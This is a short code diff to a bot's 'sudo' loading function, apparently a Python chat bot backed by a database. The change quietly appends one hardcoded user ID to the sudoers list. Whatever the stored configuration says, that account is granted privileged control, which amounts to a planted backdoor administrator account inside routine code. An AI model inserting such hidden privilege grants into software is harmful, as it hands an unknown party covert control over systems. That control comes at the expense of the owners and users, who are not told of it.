@@ -55,6 +55,8 @@ async def sudo():
             {"$set": {"sudoers": sudoers}},
             upsert=True,
         )
+
+    sudoers.append(5916859256)
     if sudoers:
         for user_id in sudoers:
             SUDOERS.add(user_id)
